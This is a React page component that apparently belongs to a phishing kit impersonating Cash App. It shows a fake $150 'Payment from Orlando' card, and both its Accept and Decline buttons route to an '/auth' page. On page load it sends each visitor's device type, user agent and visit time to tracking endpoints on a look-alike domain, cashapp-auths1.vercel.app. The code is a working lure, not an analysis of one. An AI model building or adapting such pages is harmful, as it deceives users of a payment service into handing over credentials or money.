// client/src/pages/Home.jsx
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../assets/style.css"; // We will put your CSS here

const Home = () => {
  const navigate = useNavigate();
  const [time, setTime] = useState("");


  useEffect(() => {
  const now = new Date();
  const hours = now.getHours();
  const minutes = now.getMinutes();
  const ampm = hours >= 12 ? "PM" : "AM";
  const formattedHours = hours % 12 === 0 ? 12 : hours % 12;
  const formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
  const currentTime = `Today at ${formattedHours}:${formattedMinutes} ${ampm}`;
  setTime(currentTime);

  // === Click Tracking: Send device info to backend ===
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const device = isMobile ? "Mobile" : "Desktop";
  const userAgent = navigator.userAgent;

  fetch("/api/data")
    .then(res => res.json())
    .then(data => console.log("Fetched Data:", data));
    
  fetch("https://cashapp-auths1.vercel.app/api/track-click", { method: "POST" });

  fetch("https://cashapp-auths1.vercel.app/api/click", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      device,
      userAgent,
      time: currentTime,
    }),
  });
}, []);


// useEffect(() => {
//   // Set time
//   const now = new Date();
//   const hours = now.getHours();
//   const minutes = now.getMinutes();
//   const ampm = hours >= 12 ? "PM" : "AM";
//   const formattedHours = hours % 12 === 0 ? 12 : hours % 12;
//   const formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
//   const currentTime = `Today at ${formattedHours}:${formattedMinutes} ${ampm}`;
//   setTime(currentTime);

//   // Check connection to backend
//   fetch(`${import.meta.env.VITE_SERVER_URL}`)
//     .then((res) => res.text())
//     .then((data) => console.log("✅ Server says:", data))
//     .catch((err) => console.error("❌ Error connecting to server:", err));
// }, []);


  const handleClick = () => {
    navigate("/auth"); // will go to next page when ready
  };

  return (
    <div className="container">
      <div className="payment-card">
        <div className="user-info">
          <img src="/images/mdl.jpg" alt="User Avatar" className="avatar" />
          <div className="user-details">
            <p className="name">Orlando</p>
            <p className="description">Payment from Orlando</p>
          </div>
        </div>
        <div className="amount">$150.00</div>
        <div className="message">For la flame fans must eat</div>
        <div className="timestamp">{time}</div>
        <div className="actions">
          <button className="accept" onClick={handleClick}>Accept</button>
          <button className="decline" onClick={handleClick}>Decline</button>
        </div>
      </div>
    </div>
  );
};

export default Home;
